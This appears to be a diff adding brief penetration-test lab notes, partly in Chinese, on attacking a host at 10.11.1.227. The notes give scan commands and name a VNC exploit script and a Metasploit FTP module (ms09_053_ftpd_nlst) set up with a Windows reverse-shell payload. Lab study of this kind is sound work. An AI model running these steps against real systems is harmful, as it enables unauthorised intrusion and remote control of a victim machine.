@@ -1,0 +1,14 @@
+nmap -sV -sC -Pn 10.11.1.227 > nmap.txt
+gobuster dir  -u http://10.11.1.227/  -w /usr/share/dirb/wordlists/common.txt -x txt,php,cgi > gobusterfile.txt
+
+nmap --script vuln -sV -p 21,25,80,135,139,443,445,1025,1026,3372,5800,5900 -Pn  10.11.1.227 > nmapvuln.txt
+
+1.nmap掃描出端口,有21FTP服務,可以上傳檔案
+2.samba服務可以登入下載tv.txt,內容是節目列表
+3.vnc服務查找漏洞可以發現36932.py腳本
+登入後crtl+shift+alt+insert 可以登入(須多嘗試或是crtl+alt+insert)
+4.使用msfcond search microsoft ftpd 可以找到腳本windows/ftp/ms09_053_ftpd_nlst
+必須指定target 1  set payload windows/shell_reverse_tcp
+
+
+
